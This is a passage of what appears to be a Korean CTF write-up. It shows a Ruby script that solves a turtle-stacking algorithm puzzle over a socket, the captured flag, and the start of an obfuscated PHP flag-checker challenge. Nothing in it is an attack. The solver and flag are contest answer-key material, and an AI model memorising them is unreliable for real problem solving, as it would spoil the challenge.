  &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;with_index&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turtle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;acc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;max_by&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;prob2.christmasctf.com&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4941&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Instruction&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;turtle_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;lines&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;until&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/round/&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtle_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtle_count&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;nil?&lt;/span&gt;
      &lt;span class=&quot;nb&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;lines&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;turtle_count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vg&quot;&gt;$1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;force_encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/^거북이\s*=\s*(\d+)/&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/^No\./&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;weight&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;measure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;measure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;measure&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;weight&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;answer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turtles&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; turtles&quot;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;20문제를 풀게 되면 다음과 같은 메시지를 받을 수 있습니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Congratz! You are Dynamic algorithm master
The Flag is christmas{Rac_reKrei$her_!s_so_cute_@lligat0r!}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag는 &lt;code&gt;Rac_reKrei$her_!s_so_cute_@lligat0r!&lt;/code&gt;입니다.&lt;/p&gt;

&lt;h2&gt;&lt;a id=&quot;php-obfuscate&quot;&gt;&lt;/a&gt;PHP Obfuscate - WEB500&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;PHP Version 5.2.12에서 테스트했습니다&lt;/p&gt;

&lt;p&gt;의도하지 않은 풀이가 존재할 경우에 &lt;a href=&quot;mailto:christmasctf@gmail.com&quot;&gt;christmasctf@gmail.com&lt;/a&gt; 로 메일을 보내주세요!&lt;/p&gt;

&lt;p&gt;답 처리 해드립니다 :)&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://goo.gl/ml28eF&quot;&gt;http://goo.gl/ml28eF&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;위 링크에 접근이 되지 않는다면 &lt;a href=&quot;/downloads/2014/12/26/phpobfuscate_6edfd44ed0290d72e6b9a59f256e8dc0.zip&quot;&gt;이 링크&lt;/a&gt;를 사용해주시기 바랍니다.&lt;/p&gt;

&lt;p&gt;압축을 풀면 난독화된 &lt;code&gt;index.php&lt;/code&gt;가 나옵니다:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;////////////////////////
//          stage1         //
////////////////////////
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;â&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$à&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wrong&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$á&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
